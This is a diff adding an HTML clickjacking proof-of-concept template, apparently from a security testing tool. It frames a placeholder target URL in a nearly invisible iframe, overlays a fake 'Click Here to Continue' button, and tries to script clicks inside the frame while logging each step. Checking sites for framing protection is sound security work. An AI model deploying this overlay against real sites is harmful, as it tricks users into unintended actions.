@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Clickjacking PoC</title>
+
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #f3f4f6;
+            font-family: Arial, sans-serif;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Container for iframe attack */
+        .attack-container {
+            position: relative;
+            width: 100%;
+            height: 100%;
+        }
+
+        /* The target site inside iframe */
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.05; /* nearly invisible */
+            pointer-events: auto;
+            border: 0;
+        }
+
+        /* Fake UI designed to trick user */
+        .fake-button {
+            position: absolute;
+            top: 40%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 18px 32px;
+            font-size: 18px;
+            background: #2563eb;
+            color: white;
+            border-radius: 8px;
+            cursor: pointer;
+            z-index: 99999;
+            text-align: center;
+            box-shadow: 0 4px 18px rgba(0,0,0,0.25);
+        }
+
+        /* Log panel */
+        .log-panel {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 180px;
+            background: rgba(17, 24, 39, 0.85);
+            color: #e5e7eb;
+            font-size: 12px;
+            padding: 10px;
+            overflow-y: auto;
+            z-index: 100000;
+        }
+
+        .log-entry {
+            margin-bottom: 6px;
+        }
+    </style>
+
+</head>
+<body>
+
+    <div class="attack-container">
+        <!-- Target site inside hidden iframe -->
+        <iframe id="targetFrame" src="{{ target_url }}"></iframe>
+
+        <!-- Fake button that overlays victim button -->
+        <div id="fakeBtn" class="fake-button">
+            Click Here to Continue
+        </div>
+
+        <!-- Log Panel -->
+        <div id="logPanel" class="log-panel"></div>
+    </div>
+
+
+
+    <script>
+        function log(msg) {
+            const panel = document.getElementById("logPanel");
+            const div = document.createElement("div");
+            div.classList.add("log-entry");
+            div.textContent = "[" + new Date().toISOString() + "] " + msg;
+            panel.appendChild(div);
+            panel.scrollTop = panel.scrollHeight;
+        }
+
+        log("Attacker page loaded.");
+        log("Loading target in iframe: {{ target_url }}");
+
+
+        // Click Hijack Simulation
+        document.getElementById("fakeBtn").addEventListener("click", function () {
+            log("Fake button clicked. Attempting clickjacking...");
+
+            const iframe = document.getElementById("targetFrame");
+
+            try {
+                // Try accessing iframe
+                const iframeDoc = iframe.contentWindow.document;
+
+                // Attempt finding a button (generic exploit scenario)
+                let possibleButtons = iframeDoc.querySelectorAll("button, input[type=submit]");
+
+                if (possibleButtons.length > 0) {
+                    possibleButtons[0].click();
+                    log("Clicked target button inside iframe!");
+                } else {
+                    log("No clickable elements found inside iframe.");
+                }
+
+            } catch (e) {
+                log("Blocked by browser security. Cannot access iframe. " + e.message);
+            }
+        });
+
+        // Iframe load event
+        document.getElementById("targetFrame").addEventListener("load", function () {
+            log("Iframe loaded successfully.");
+        });
+
+    </script>
+
+</body>
+</html>
